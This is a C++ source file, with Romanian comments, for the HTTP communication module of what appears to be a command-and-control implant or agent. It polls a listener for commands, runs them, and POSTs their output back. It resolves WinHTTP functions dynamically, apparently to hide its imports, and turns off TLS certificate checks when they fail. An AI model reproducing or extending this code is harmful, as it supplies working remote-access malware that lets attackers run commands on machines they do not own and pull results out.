#include "HttpCommunicator.h"
#include "dependencies.h"
#include <iostream>
#include "core.h"


HttpCommunicator* HttpCommunicator::communicator = NULL;

HttpCommunicator::HttpCommunicator(std::string listenerIp, int listenerPort) {
	this->listenerIp = listenerIp;
	this->listenerPort = listenerPort;

	// Workaround for now
	HttpCommunicator::communicator = this;
}

void HttpCommunicator::get_commands() {
	HMODULE hWinhttp = LoadLibraryA("winhttp.dll");

	PVOID pWinHttpOpen = GetProcAddress(hWinhttp, "WinHttpOpen");
	PVOID pWinHttpConnect = GetProcAddress(hWinhttp, "WinHttpConnect");
	PVOID pWinHttpOpenRequest = GetProcAddress(hWinhttp, "WinHttpOpenRequest");
	PVOID pWinHttpSendRequest = GetProcAddress(hWinhttp, "WinHttpSendRequest");
	PVOID pWinHttpReceiveResponse = GetProcAddress(hWinhttp, "WinHttpReceiveResponse");
	PVOID pWinHttpReadData = GetProcAddress(hWinhttp, "WinHttpReadData");
	PVOID pWinHttpSetOption = GetProcAddress(hWinhttp, "WinHttpSetOption");

	WinHttpOpenFunctionPointer WinHttpOpen = (WinHttpOpenFunctionPointer)pWinHttpOpen;
	WinHttpConnectFunctionPointer WinHttpConnect = (WinHttpConnectFunctionPointer)pWinHttpConnect;
	WinHttpOpenRequestFunctionPointer WinHttpOpenRequest = (WinHttpOpenRequestFunctionPointer)pWinHttpOpenRequest;
	WinHttpSendRequestFunctionPointer WinHttpSendRequest = (WinHttpSendRequestFunctionPointer)pWinHttpSendRequest;
	WinHttpReceiveResponseFunctionPointer WinHttpReceiveResponse = (WinHttpReceiveResponseFunctionPointer)pWinHttpReceiveResponse;
	WinHttpReadDataFunctionPointer WinHttpReadData = (WinHttpReadDataFunctionPointer)pWinHttpReadData;
	WinHttpSetOptionFunctionPointer WinHttpSetOption = (WinHttpSetOptionFunctionPointer)pWinHttpSetOption;

	HINTERNET hSession = WinHttpOpen(
		NULL,
		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		0 // No TLS
	);

	std::wstring targetStr = std::wstring(this->listenerIp.begin(), this->listenerIp.end());

	LPCWSTR target = targetStr.c_str();

	HINTERNET hConnect = WinHttpConnect(
		hSession,
		target, // host-ul accesat
		(INTERNET_PORT) this->listenerPort,
		0
	);
	
	std::string identifierEndpoint = "/" + core::instance->identifier;

	std::wstring targetEndpointStr = std::wstring(identifierEndpoint.begin(), identifierEndpoint.end());
	LPCWSTR targetEndpoint = targetEndpointStr.c_str();

	HINTERNET hReq = WinHttpOpenRequest(
		hConnect,
		L"GET", // metoda folosita
		targetEndpoint, // endpoint-ul accesat
		NULL, // NULL - foloseste HTTP/1.1
		WINHTTP_NO_REFERER, // nu va folosi referer
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		WINHTTP_FLAG_REFRESH
	);


	bool retry = false;
	DWORD result;

	do {
		retry = false;
		result = NO_ERROR;

		if (!WinHttpSendRequest(
			hReq,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0,
			WINHTTP_NO_REQUEST_DATA,
			0,
			0,
			0
		)) {
			result = GetLastError();
			if (result == ERROR_WINHTTP_SECURE_FAILURE)
			{
				DWORD dwFlags =
					SECURITY_FLAG_IGNORE_UNKNOWN_CA |
					SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
					SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

				if (WinHttpSetOption(
					hReq,
					WINHTTP_OPTION_SECURITY_FLAGS,
					&dwFlags,
					sizeof(dwFlags)))
				{
					retry = true;
				}
			}
			else if (result == ERROR_WINHTTP_RESEND_REQUEST)
			{
				retry = true;
			}
		}

	} while (retry);

	if (!WinHttpReceiveResponse(
		hReq,
		NULL
	)) {
		std::cout << "[+] Error: " << GetLastError() << std::endl;
	}

	std::vector<BYTE> buf;
	DWORD bytesRead = 0;

	do {
		BYTE temp[4096]{};
		if (!WinHttpReadData(
			hReq,
			temp, // buffer de output
			sizeof(temp), // numarul maxim de bytes pe care sa il citeasca
			&bytesRead // salveaza numarul de bytes cititi
		)) {
			std::cout << "[+] Error: " << GetLastError() << std::endl;
		}
		buf.insert(buf.end(), std::begin(temp), std::end(temp));
	} while (bytesRead > 0);

	std::string resultStr(buf.begin(), buf.end());
	std::vector<std::string> resultDeserialized = dependencies::deserialize_array(resultStr);
	this->commandsToExecute.insert(this->commandsToExecute.end(), resultDeserialized.begin(), resultDeserialized.end());
	this->execute_commands();
}

void HttpCommunicator::send_output(std::string msg) {
	HMODULE hWinhttp = LoadLibraryA("winhttp.dll");

	PVOID pWinHttpOpen = GetProcAddress(hWinhttp, "WinHttpOpen");
	PVOID pWinHttpConnect = GetProcAddress(hWinhttp, "WinHttpConnect");
	PVOID pWinHttpOpenRequest = GetProcAddress(hWinhttp, "WinHttpOpenRequest");
	PVOID pWinHttpSendRequest = GetProcAddress(hWinhttp, "WinHttpSendRequest");
	PVOID pWinHttpReceiveResponse = GetProcAddress(hWinhttp, "WinHttpReceiveResponse");
	PVOID pWinHttpReadData = GetProcAddress(hWinhttp, "WinHttpReadData");
	PVOID pWinHttpSetOption = GetProcAddress(hWinhttp, "WinHttpSetOption");

	WinHttpOpenFunctionPointer WinHttpOpen = (WinHttpOpenFunctionPointer)pWinHttpOpen;
	WinHttpConnectFunctionPointer WinHttpConnect = (WinHttpConnectFunctionPointer)pWinHttpConnect;
	WinHttpOpenRequestFunctionPointer WinHttpOpenRequest = (WinHttpOpenRequestFunctionPointer)pWinHttpOpenRequest;
	WinHttpSendRequestFunctionPointer WinHttpSendRequest = (WinHttpSendRequestFunctionPointer)pWinHttpSendRequest;
	WinHttpReceiveResponseFunctionPointer WinHttpReceiveResponse = (WinHttpReceiveResponseFunctionPointer)pWinHttpReceiveResponse;
	WinHttpReadDataFunctionPointer WinHttpReadData = (WinHttpReadDataFunctionPointer)pWinHttpReadData;
	WinHttpSetOptionFunctionPointer WinHttpSetOption = (WinHttpSetOptionFunctionPointer)pWinHttpSetOption;

	HINTERNET hSession = WinHttpOpen(
		NULL,
		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		0 // No TLS
	);

	std::wstring targetStr = std::wstring(this->listenerIp.begin(), this->listenerIp.end());

	LPCWSTR target = targetStr.c_str();

	HINTERNET hConnect = WinHttpConnect(
		hSession,
		target, // host-ul accesat
		(INTERNET_PORT)this->listenerPort,
		0
	);

	std::string identifierEndpoint = "/" + core::instance->identifier;

	std::wstring targetEndpointStr = std::wstring(identifierEndpoint.begin(), identifierEndpoint.end());
	LPCWSTR targetEndpoint = targetEndpointStr.c_str();

	HINTERNET hReq = WinHttpOpenRequest(
		hConnect,
		L"POST", // metoda folosita
		targetEndpoint, // endpoint-ul accesat
		NULL, // NULL - foloseste HTTP/1.1
		WINHTTP_NO_REFERER, // nu va folosi referer
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		WINHTTP_FLAG_REFRESH
	);

	LPSTR postBody = const_cast<char*>(msg.c_str());

	bool retry = false;
	DWORD result;

	do {
		retry = false;
		result = NO_ERROR;

		if (!WinHttpSendRequest(
			hReq,
			L"text/plain",
			-1,
			postBody,
			strlen(postBody),
			strlen(postBody),
			NULL
		)) {
			result = GetLastError();
			if (result == ERROR_WINHTTP_SECURE_FAILURE)
			{
				DWORD dwFlags =
					SECURITY_FLAG_IGNORE_UNKNOWN_CA |
					SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
					SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

				if (WinHttpSetOption(
					hReq,
					WINHTTP_OPTION_SECURITY_FLAGS,
					&dwFlags,
					sizeof(dwFlags)))
				{
					retry = true;
				}
			}
			else if (result == ERROR_WINHTTP_RESEND_REQUEST)
			{
				retry = true;
			}
		}

	} while (retry);

	if (!WinHttpReceiveResponse(
		hReq,
		NULL
	)) {
		std::cout << "[+] Error: " << GetLastError() << std::endl;
	}

	std::vector<BYTE> buf;
	DWORD bytesRead = 0;

	do {
		BYTE temp[4096]{};
		if (!WinHttpReadData(
			hReq,
			temp, // buffer de output
			sizeof(temp), // numarul maxim de bytes pe care sa il citeasca
			&bytesRead // salveaza numarul de bytes cititi
		)) {
			std::cout << "[+] Error: " << GetLastError() << std::endl;
		}
		buf.insert(buf.end(), std::begin(temp), std::end(temp));
	} while (bytesRead > 0);

	std::string resultStr(buf.begin(), buf.end());

}